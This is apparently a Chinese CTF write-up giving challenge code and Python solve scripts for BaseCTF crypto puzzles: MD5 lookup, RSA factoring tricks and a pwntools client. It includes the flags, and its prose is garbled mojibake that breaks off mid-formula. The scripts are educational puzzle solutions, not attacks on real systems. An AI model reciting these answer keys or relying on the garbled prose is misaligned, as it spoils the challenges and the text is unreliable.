class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>, <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> output:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">128</span>):<br>        my_md5=hashlib.md5()<br>        my_md5.update(<span class="hljs-built_in">chr</span>(j).encode())<br>        <span class="hljs-keyword">if</span>  my_md5.hexdigest() == i:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j),end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#BaseCTF&#123;a4bf43a5-3ff9-4764-bda2-af8ee4db9a8a&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h2><h3 id="two_squares"><a class="markdownIt-Anchor" href="#two_squares"></a> two_squares</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br>p=getPrime(<span class="hljs-number">128</span>)<br>q=getPrime(<span class="hljs-number">128</span>)<br>n=p*q<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>x=p^<span class="hljs-number">2</span>+q^<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x =&quot;</span>,x)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 42330675787206041757903427737108553993012805007294570657461042152628982126538</span><br><span class="hljs-string">x = 209479773119142584969854470862023704936857416491817498021871883305658177375498</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨sageä¸­çš„two_squares()å¯ä»¥å¾ˆæ–¹ä¾¿çš„è¿›è¡Œæ±‚è§£<br />ï¼ˆæ­¤é¢˜æœ¬æ„å°±æ˜¯ä¸€é“ç¯å¢ƒé¢˜ï¼Œå¯¼è‡´å¾ˆå¤šæ–°æ‰‹è¯¯è§£ï¼Œå†æ¬¡é“ä¸ªæ­‰ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">42330675787206041757903427737108553993012805007294570657461042152628982126538</span><br>x = <span class="hljs-number">209479773119142584969854470862023704936857416491817498021871883305658177375498</span><br>p,q=two_squares(x)<br>p,q=<span class="hljs-built_in">int</span>(p),<span class="hljs-built_in">int</span>(q)<br>n=p*q<br>phin=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phin)<br>a=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n)))<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-comment"># b&#x27;BaseCTF&#123;0760becd-cefaab0b094d&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="random_primes"><a class="markdownIt-Anchor" href="#random_primes"></a> random_primes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_n</span>():<br>    primes=[getPrime(<span class="hljs-number">128</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        n *= primes[random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">127</span>)]<br>    <span class="hljs-keyword">return</span> primes,n<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">45</span><br><br>primes,n = gen_n()<br>e = <span class="hljs-number">0x010001</span><br><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;primes =&quot;</span>,primes)<br></code></pre></td></tr></table></figure><p>nå¾ˆå¤§å¾ˆå¤§ï¼Œç»™äº†flagèŒƒå›´ï¼Œå¯ä»¥å¾—å‡ºflagä¸º359ä½</p><p>ç´ æ•°éƒ½æ˜¯128ï¼Œåˆ©ç”¨3ä¸ªç´ æ•°ï¼ˆå¤§çº¦384ä½ï¼‰å³å¯æ¯”flagå¤§</p><p>å¯ä»¥ç›´æ¥çˆ†ç ´</p><p>ï¼ˆæ•°æ®å¤ªå¤šå°±ä¸è´´äº†ï¼‰</p><p>ï¼ˆå¥½å¤šå¸ˆå‚…æ¥é—®æˆ‘æœ€åä¸ºä»€ä¹ˆæ±‚å‡ºæ¥æ˜¯0ï¼Œä¸€çœ‹ä»–ä»¬éƒ½æ˜¯æ‰¾å‡ºäº†æ‰€æœ‰ç´ æ•°ï¼Œè€Œä¸”è¿‡ç¨‹ä¸­éƒ½é™¤ä»¥äº†nï¼Œå¯¼è‡´æœ€ån=1ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># n =</span><br><span class="hljs-comment"># e = </span><br><span class="hljs-comment"># c = </span><br><span class="hljs-comment"># primes =</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> primes:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> primes:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> primes:<br>            tn=i*j*k<br>            phi=(i-<span class="hljs-number">1</span>)*(j-<span class="hljs-number">1</span>)*(k-<span class="hljs-number">1</span>)<br>            m=long_to_bytes(<span class="hljs-built_in">pow</span>(c,invert(e,phi),tn))<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>                <span class="hljs-built_in">print</span>(m)<br>                exit()<br></code></pre></td></tr></table></figure><h3 id="basic"><a class="markdownIt-Anchor" href="#basic"></a> basic</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>).encode()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        printable_chars = string.ascii_letters + string.digits + string.punctuation<br>        optional=[<span class="hljs-string">b&#x27;A&#x27;</span>,<span class="hljs-string">b&#x27;B&#x27;</span>,<span class="hljs-string">b&#x27;C&#x27;</span>,<span class="hljs-string">b&#x27;D&#x27;</span>]<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>            secret= <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(printable_chars, k=<span class="hljs-number">16</span>)).encode()<br>            select=random.choice(optional)<br>            <span class="hljs-variable language_">self</span>.send(select)<br>            enc=<span class="hljs-string">b&#x27;&#x27;</span><br>            <span class="hljs-keyword">if</span> select==<span class="hljs-string">b&#x27;A&#x27;</span>:<br>                enc=base64.b64encode(secret)<br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;B&#x27;</span>:<br>                enc=secret.<span class="hljs-built_in">hex</span>().encode()<br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;C&#x27;</span>:<br>                enc=bytes_to_long(secret)<br>                enc=<span class="hljs-built_in">str</span>(enc).encode()<br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;D&#x27;</span>:<br>                enc=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> secret]<br>                enc=<span class="hljs-built_in">str</span>(enc).encode()<br>            <span class="hljs-variable language_">self</span>.send(enc)<br>            client_send=<span class="hljs-variable language_">self</span>.recv()<br>            <span class="hljs-keyword">if</span> client_send!=secret:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">&quot;\nYou wrong!!!!!&quot;</span>)<br>                exit()<br><br>        <span class="hljs-variable language_">self</span>.send(flag)<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p>ä¸€é“äº¤äº’é¢˜ï¼Œå››ç§åŠ å¯†æ–¹å¼</p><p>ä¸»è¦å®ç°å››ç§åŠ å¯†æ–¹å¼</p><p>Aï¼šbase64</p><p>Bï¼šç›´æ¥è½¬æˆåå…­è¿›åˆ¶</p><p>Cï¼šè½¬æˆæ•´å‹</p><p>Dï¼šæ¯ä¸ªå­—ç¬¦è½¬æˆasciiç </p><p>ä¸»è¦è€ƒå¯Ÿpwntoolsçš„ä½¿ç”¨</p><p>ï¼ˆæœ¬äººæŠ½è±¡ä»£ç ï¼Œè¯·è°…è§£ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>rem=remote(<span class="hljs-string">&quot;&quot;</span>,)<br><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    a=rem.recvline().decode().strip()<br>    <span class="hljs-built_in">print</span>(a,end=<span class="hljs-string">&quot; &quot;</span>)<br>    b=rem.recvline()<br>    <span class="hljs-keyword">if</span> a==<span class="hljs-string">&#x27;A&#x27;</span>:<br>        b=base64.b64decode(b)<br>    <span class="hljs-keyword">elif</span> a==<span class="hljs-string">&#x27;B&#x27;</span>:<br>        b=<span class="hljs-built_in">bytes</span>.fromhex(b.decode().strip())<br>    <span class="hljs-keyword">elif</span> a==<span class="hljs-string">&#x27;C&#x27;</span>:<br>        b=<span class="hljs-built_in">int</span>(b.decode().strip())<br>        b=long_to_bytes(b)<br>    <span class="hljs-keyword">elif</span> a==<span class="hljs-string">&#x27;D&#x27;</span>:<br>        b=ast.literal_eval(b.decode().strip())<br>        c=<span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>            c+=long_to_bytes(i)<br>        b=c<br>    <span class="hljs-built_in">print</span>(b)<br>    rem.send(b)<br><span class="hljs-built_in">print</span>(rem.recvall())<br>rem.interactive()<br></code></pre></td></tr></table></figure><h3 id="try_to_factor"><a class="markdownIt-Anchor" href="#try_to_factor"></a> try_to_factor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span>+random.randbytes(<span class="hljs-number">64</span>)<br>m=bytes_to_long(flag)<br><br>p,q,r,s,t=[getStrongPrime(<span class="hljs-number">512</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br>N=p*q*r*s*t<br><br>n=p*q<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><br>gift=random.randint(<span class="hljs-number">2</span>,n)*(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)*(s-<span class="hljs-number">1</span>)*(t-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">while</span> gift%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    gift//=<span class="hljs-number">2</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;N =&quot;</span>,N)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gift =&quot;</span>,gift)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">N = 162692163428762295773992659007654377270271126313772302197255271375236131917158614424426498628778734679898165422129699410934825650141972454562350664161510689489443251515884304101827584411577749250383438126881931889798597627663578045519256806107514170414321556291545302688028088470848270636776466672843710163017531472049823632822203461654253767303314505996071453898533003519236112138591066133289040889933161978131399309340741554076140734156174295730180874473301361701867633594222054688204666518058106672165786417002466165926062199279674267145233283545524775943767021416906072142236079753359492846480515376121887507681663761713445807717270089017438999615422884163666812016989696908657065537508715229685120221307021151610089917537155165897740417480127289719971512938348936259</span><br><span class="hljs-string">c = 113962118676826667648935023618252851875440854724310328843964819392166304653581141146631375503931008732348730639629174670963727399860571217264854300057305570824097216782800531930906801885967717639795643406206813677461127762087560021634738167845077869308515223303820469892552545806179267969169748886980836435095</span><br><span class="hljs-string">gift = 863514692222931709925579242743251211976114217396765747601042357918763818732391790491059528595917786523674732369068315533549380754409535403506339052401422249684188032949680148055803474336983973622610403448963752802490806614810077181934627694570685722842963961551889267501616799757825675192653489096007790143775773378495299981666657347802233798206597104474595281241837323214457344961462510183726339545608046357281265026013496037522835659867389206279894057481600882665189079672009577651494435000349624334685832217586703242422260870866432379257259316411280539845741932725104662417642890238587876489774492067722351467773093391502588019563488688309892102039611978767690653206664257400163618467825666105966072942726011447079204869750153256054140924951306811971422635104088608275908232688385437145325481792836532453258784103533536292492138405929815964841772656055397705840797739586953744563989819811944946916720655079908564653686456283647030055622241840292127096994325415897266379446446435164189216562921252341705747891518007710533906231225283309180960546212899099652226954393826875</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>ï¼ˆæ­¤é¢˜ç®—æ˜¯ä¸´æ—¶åŠ çš„ï¼Œå› ä¸ºæˆ‘åšä¸å‡ºmoectfç¬¬äºŒå‘¨çš„é¢˜ï¼Œæƒ³ç€å¢åŠ ç‚¹éš¾åº¦ï¼Ÿæ‰€ä»¥æˆ‘ä¸€å¼€å§‹å°±æ˜¯å‡†å¤‡ç»™è®ºæ–‡çš„ï¼Œå¦‚æœä½ èƒ½å¤Ÿè®¤çœŸé™ä¸‹å¿ƒæ¥çœ‹å®Œè®ºæ–‡ï¼Œåº”è¯¥å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜äº†ã€‚è®ºæ–‡ä¸­ç»™å‡ºäº†ç®—æ³•æµç¨‹ï¼Œå¹¶ä¸éœ€è¦ææ‡‚åŸç†å°±å¯ä»¥å‡ºï¼Œå¾ˆå¤šå¸ˆå‚…æ‰¾çš„æ¨¡æ¿ä¹Ÿæ˜¯å¯ä»¥ç”¨çš„ï¼Œå°†giftæ¯æ¬¡ä¹˜2çˆ†ç ´å°±è¡Œï¼Œæˆ‘è¿™é‡Œåªæ˜¯ç¨å¾®æ”¹äº†ä¸€ä¸‹å¸Œæœ›ä¸æ˜¯æ‹¿åˆ°æ¨¡æ¿èƒ½ç›´æ¥å‡ºçš„é‚£ç§ã€‚æœ€åå¦‚æœè®©ä½ æ„Ÿåˆ°äº†ä¸å¥½çš„ä½“éªŒï¼Œæˆ‘åœ¨è¿™é“ä¸ªæ­‰ã€‚</p><p>å…³äºNå’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>è¿›è¡Œåˆ†è§£çš„è„šæœ¬ï¼Œå½“ç„¶å¯ä»¥ç›´æ¥ç”¨ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œçˆ†ç ´xå€çš„2ï¼Œç„¶åå¥—è„šæœ¬ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚æˆ‘è¿™é‡Œåªæ˜¯ç¨ç¨å¾®é­”æ”¹äº†ä¸€ç‚¹ã€‚è¿™é‡Œé¢ä¹Ÿæœ‰å¾ˆå¤šè„šæœ¬ï¼Œæ„Ÿå…´è¶£å¯ä»¥å¤šçœ‹çœ‹</p><p><a href="https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py%EF%BC%89">https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.pyï¼‰</a></p><p>å…ˆè´´ä¸€ä¸‹è®ºæ–‡<a href="https://link.springer.com/content/pdf/10.1007/3-540-36492-7_25.pdf">3-540-36492-7_25.pdf (springer.com)</a>ï¼Œä¸»è¦æ˜¯å…¶ä¸­çš„ç¬¬ä¸‰éƒ¨åˆ†</p><p>å½“ç„¶çœ‹ä¸æ‡‚è®ºæ–‡ä¹Ÿæ²¡äº‹ï¼Œä¸è¿‡å¯ä»¥é€‚å½“çœ‹ä¸€ä¸‹2-Primeå’Œ3-Primeçš„éƒ¨åˆ†ï¼Œèƒ½å¤ŸæŒ‰ç®—æ³•æµç¨‹å®ç°å°±å¯ä»¥å¾—åˆ°flagï¼Œä¸»è¦æ˜¯æ€æƒ³ã€‚</p><p>å…ˆä»åå¾€å‰çœ‹ï¼Œæœ€åå¯¹flagè¿›è¡Œäº†2ä¸ªç´ æ•°çš„rsaåŠ å¯†ï¼Œç»™äº†ä¸€ä¸ªgiftä¸ºkå€çš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>é™¤å»xå€çš„2ã€‚</p><p>ä»è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¦æ ¹æ®ç»™çš„è¿™ä¸ªgiftå’Œä¹‹å‰çš„Næ¥åˆ†è§£å‡ºpå’Œqã€‚</p><p>ï¼ˆåˆ†è§£å‡ºæ¥æ˜¯5ä¸ªæ•°ï¼Œçˆ†ç ´ä¸€ä¸‹å°±å¯ä»¥äº†ï¼‰</p><p>ç®—æ³•æµç¨‹ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š</mtext><mi>k</mi><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>2</mn><mi>x</mi></msup><mo>âˆ—</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mspace linebreak="newline"></mspace><mtext>æ¯ä¸€æ¬¡åˆ†è§£æ—¶ï¼šéšæœºå–ä¸€ä¸ªæ•°</mtext><mi>w</mi><mo>âˆˆ</mo><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mi>N</mi><mo>âˆ’</mo><mn>2</mn><mo stretchy="false">]</mo><mspace linebreak="newline"></mspace><mtext>è®¡ç®—æ•°</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>=</mo><msup><mi>w</mi><mrow><msup><mn>2</mn><mi>s</mi></msup><mo>âˆ—</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi 